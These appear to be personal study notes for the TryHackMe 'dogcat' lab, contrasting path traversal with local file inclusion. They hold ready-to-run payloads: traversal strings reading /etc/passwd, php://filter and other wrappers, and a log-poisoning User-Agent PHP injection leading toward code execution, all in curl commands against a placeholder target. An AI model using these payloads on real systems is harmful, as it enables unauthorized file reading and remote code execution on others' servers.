# dogcat

<details>
    <summary></summary>

## **`path traversal VS LFI`**
   
- **Path Traversal** = *jumping in the folder tree* using `../` to access a file that you are not allowed to view (usually the endpoint reads/returns a file).

- **LFI (Local File Inclusion)** = *Inserting a file into a server/application* --- The input is used in include/require functions or displaying files within the application. **LFI can use Path Traversal** to access a file, but it has a broader footprint (its use can lead to code execution).

--- 

**Mnemonic:**

> Path traversal = "..\" (jump folders) --- LFI = "include/require" (app includes file).

---

**Path traversal (eg download endpoint):**

- URL: `GET /download?file=reports/2024.pdf`

- Test: `file=../../../../etc/passwd` → the server returns the content of `/etc/passwd`

- Behavior: The server reads and returns the file to the user.



**LFI (PHP example):**

```php
<?php
$page = $_GET['page'];
include("/var/www/pages/". $page);
?>
```

- Test: `page=../../../../etc/passwd` → may print file content within web page (LFI).

- But LFI can be improved: `page=php://filter/convert.base64-encode/resource=../../../../etc/passwd` → returns the base64 content (when characters do not appear correctly).

---

Examples of quick payloads for testing
=============================================

-   **Path traversal (only reading tests):**

    -   `../../../../etc/passwd`

    -   `..%2f..%2f..%2fetc%2fpasswd` (URL-encoded)

    -   `....//....//etc/passwd` (some servers deal with strange conversion methods)



-   **LFI-specific cheats:**

    -   `php://filter/convert.base64-encode/resource=../../../../etc/passwd` (for PHP)

    -   Trying to read logs: `../../../../var/log/apache2/access.log` and then injecting an HTTP request with a payload to record it in the log (log poisoning) → then include on the log → execute code (RCE) in some cases.

    -   `expect://`, `data://`, `input://` --- wrappers can be used if possible.

> Note: The null byte (`%00`) is old and does not work on modern versions of PHP, so relying on it is not reliable.




---

How do you tell them apart in practice (quick test)
=============================================

1. Try `../../../../etc/passwd`

    - If the file content appears → you will be able to say **Path Traversal or LFI**.

2. See the response:

    - If the server returns the file as **download/attachment** or plain file content → often **Path Traversal** (endpoint dedicated to reading/downloading files).

    - If the file appears inside the application page or is passed through include → usually **LFI**.









----
----

<details>
  <summary>how to know which one you face</summary>



Detailed process steps (with commands + what to expect)
---------------------------------------

### 1) Simple request for path (read file)

commander:

```
curl -i "http://TARGET/vulnerable?file=../../../../etc/passwd"
```

- **If the content of /etc/passwd appears as clear text** (and the HTTP status is 200): Possible **Path Traversal or LFI** --- additional checks are needed to distinguish them.

- See the response headers (`Content-Type`, `Content-Disposition`):

    - `Content-Disposition: attachment; filename="etc_passwd"` → Mostly **Path Traversal** (endpoint is for mounting).

    - `Content-Type: text/html` and the content is embedded within an HTML page → possibly **LFI** (included in page).


---

### 2) PHP wrapper test (robust differentiation test---tests LFI on PHP applications)

commander:

```
curl -s "http://TARGET/vulnerable?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd"
```

- **If it returns base64** → This is strong evidence that the request went through PHP's include/require function --- **LFI** (not just read/download).

- **If it does not change** or the server rejects it → it is less likely that there is an LFI on PHP (but it may be Path Traversal or another language).

---

### 3) Does the file appear as a download file or within a page?

- Load/Attachment/Content-Disposition → **Path Traversal** Mostly.

- Within an HTML page (eg content between `<pre>` or at a page location) → **LFI** or include.

- Note: Some applications may return the file inside HTML even though it is just reading --- see the following steps.

---

### 4) Test the behavior by calling the application's PHP file

-   Try requesting an internal PHP file that usually exists (eg `/index.php`):

```
curl -i "http://TARGET/vulnerable?file=../../../../var/www/html/index.php"
```

-   **If the content is returned as PHP source code (meaning <?php ...)** → this means the server only *read* the file as text → mostly **Path Traversal** on the reading endpoint.

-   **If it appears as a result of executing the index.php (the resulting HTML)** → the application means **includes the file inside the server** (running it) → this is the behavior of **LFI** or include within the display context.


> Important note: Normally including a PHP file via include cannot cause it to be executed again on the server if it is included as text; But if the application uses `include` or `require` you will see the effect of include (the PHP code may be executed in the process).



---


### 5) Log poisoning test (effectively separates LFI from path traversal)

- Send a regular request with payload in `User-Agent` or path to be registered in access.log:

```
curl -A "<?php echo 'PWN'; ?>" "http://TARGET/"
```

- Then try include for log:

```
curl -i "http://TARGET/vulnerable?file=../../../../var/log/apache2/access.log"
```

- **If the text `PWN` appears in the response** → it means the server has read the log.

- **If you observe an execution or resulting change** (eg running code) → this indicates **LFI with exploitability**.


- If `PWN` does not appear despite its presence in the log → perhaps the endpoint does not allow reading those paths (or the file is out of validity) → Path Traversal may be limited.

> Warning: Testing log poisoning on real systems may be offensive --- only use it on licensed test environments or platforms (TryHackMe).



---

Shortcut tools/commands that you can save
----------------------------------

- Normal reading:

    `curl -i "http://TARGET/vuln?file=../../../../etc/passwd"`

- PHP wrapper test:

    `curl -s "http://TARGET/vuln?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd" | base64 -d`

- Test include for PHP file:

    `curl -i "http://TARGET/vuln?file=../../../../var/www/html/index.php"`

- log poisoning test (only on test environment):

    `curl -A "<?php echo 'PWN'; ?>" "http://TARGET/"
    curl -i "http://TARGET/vuln?file=../../../../var/log/apache2/access.log"`








  
</details>

----
----









  
</details>


































## **`Nmap Scan`**

```ruby
namp -sCV 10.10.10.10
```


